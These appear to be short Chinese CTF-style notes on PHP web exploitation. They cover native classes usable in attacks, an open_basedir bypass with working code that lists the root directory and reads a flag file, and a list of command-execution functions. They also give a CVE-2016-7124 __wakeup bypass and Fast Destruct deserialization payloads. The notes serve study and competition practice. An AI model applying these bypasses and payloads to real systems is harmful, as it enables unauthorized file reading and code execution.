### 原生类利用
Error
Exception
SoapClient
#### DirectoryIterator

SimpleXMLElement

参考
https://www.anquanke.com/post/id/238482

## open_basedir绕过
https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/
```php
//查看根目录
var_dump(scandir('glob:///*'));

//读取文件,
mkdir('Von');chdir('Von');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/f1ger');
```
## 命令执行函数
```php
system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen

```
### phpinfo信息收集

## 反序列化技巧
### 绕过wakeup

> CVE-2016-7124
> 利用条件：
> PHP5 < 5.6.25
> ​PHP7 < 7.0.10
> 
> 利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
### Fast Destruct
```php
$payload = 'a:2:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{}';
$payload = 'a:3:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{}}';
$payload = 'a:2:{i:0;O:7:"classes":0:{}i:1;O:4:"Test":0:{};}';
```
